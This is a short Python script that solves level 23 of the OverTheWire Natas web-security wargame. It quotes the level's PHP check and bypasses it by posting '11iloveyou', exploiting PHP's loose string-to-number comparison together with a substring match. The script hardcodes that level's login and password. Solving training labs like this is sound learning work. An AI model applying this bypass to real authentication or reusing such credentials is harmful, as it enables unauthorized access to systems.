import requests
import re
from string import *
import time
import sys
import codecs


"""<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }"""

#strstr(vulnerable)

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas23","D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()

    r = session.post(url ,cookies={},data={"passwd":'11iloveyou'}, auth=(logar[0],logar[1]),allow_redirects=0, timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)


    print("="*80)
